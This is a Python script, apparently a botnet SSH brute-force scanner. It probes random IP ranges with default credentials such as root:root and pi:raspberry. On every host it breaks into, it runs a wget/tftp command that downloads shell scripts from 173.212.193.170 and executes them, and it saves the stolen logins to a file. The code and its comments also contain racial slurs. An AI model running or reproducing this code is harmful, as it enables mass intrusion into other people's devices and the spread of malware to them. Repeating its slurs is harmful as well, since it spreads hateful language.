#!/usr/bin/env python
# pkill python; ulimit -n 999999; python poole.py 500 SATAN 1 3
# python poole.py 500 BABY 1 6
# python poole.py 500 LRAB 1 7
# python poole.py 500 NIGGER 1 1
# python poole.py 500 TELNET 1 4
 
import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")

blacklist = [
    '127'
]

passwords = [ 
	"admin:admin"
	"root:root"
	"root:admin"
	"telnet:telnet"
	"guest:guest"
	"admin:admin"
	"admin:1234"
	"pi:raspberry"
	"vagrant:vagrant"
	"ubnt:ubnt"
]


if sys.argv[4] == '1':
     passwords = ["root:root"] 
if sys.argv[4] == '2':
     passwords = ["guest:guest"] 
if sys.argv[4] == '3':
     passwords = ["admin:1234"] 
if sys.argv[4] == '4':
     passwords = ["telnet:telnet"] 
if sys.argv[4] == '5':
	passwords = ["root:root", "admin:1234"]
if sys.argv[4] == '6':
	passwords = ["root:root", "root:admin"]
if sys.argv[4] == '7':
	passwords = ["root:root", "admin:admin", "root:admin", "admin:1234"]
if sys.argv[4] == '8':
    passwords = ["root:root", "admin:1234", "root:admin", "user:user", "test:test"]
if sys.argv[4] == 'perl':
    passwords = ["pi:raspberry", "vagrant:vagrant", "ubnt:ubnt"] 	
	
print "\x1b[1;32m************************************\x1b[1;35m"
print "\x1b[1;32m*         suk dik 4 btc          *\x1b[1;35m"
print "\x1b[1;32m*         by poole               *\x1b[1;35m"
print "\x1b[1;32m************************************\x1b[1;35m"

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "BABY": # password 6
                        br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
                        self.host = random.choice(br)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LRAB": #password 7
                        yeet = ["122","119","161","37","186","187","31","188","201","2","168"]
                        self.host = random.choice(yeet)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "NIGGER": # password 1
                        lucky = ["125.27","101.109","113.53","118.173","46.62","5.78","125.25","125.26","182.52","125.24","180.180"]
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "SATAN": #password 3
                        lucky2 = [ "122.3","122.52","122.54","119.93","124.105","125.104","49.144","49.145" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
		    elif ipclassinfo == "TELNET": # password 4
                        lucky2 = [ "103.20","103.30","103.47","103.57","12.188","12.34","13.92","14.150","14.162" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "RAND":
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "INTERNET":
                        lol = ["1"]
                        self.host = random.choice(lol)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    else:
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print '\x1b[1;32mFound \x1b[1;31m '+self.host+'~\x1b[1;35m'+username+'~\x1b[1;36m'+password+'~\x1b[1;33m'+str(port)#cd /tmp;wget http://192.210.220.254/bins.sh;chmod 777 *;sh bins.sh;rm -rf bins.sh
			ssh.exec_command("cd /tmp || cd /var/run;wget http://173.212.193.170/bin.sh;sh bin.sh;rm -rf bin.sh;tftp -r bin2.sh -g 173.212.193.170;sh bin2.sh; tftp 173.212.193.170 -c get bin3.sh; sh bin3.sh; rm -rf bin2.sh bin3.sh bin.sh")
			nigger = open("cheatsvuln.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
                        time.sleep(15)
                        ssh.close()
            except:
                pass

for x in range(0,1500):
    try:
        t = sshscanner()
        t.start()
    except:
        pass
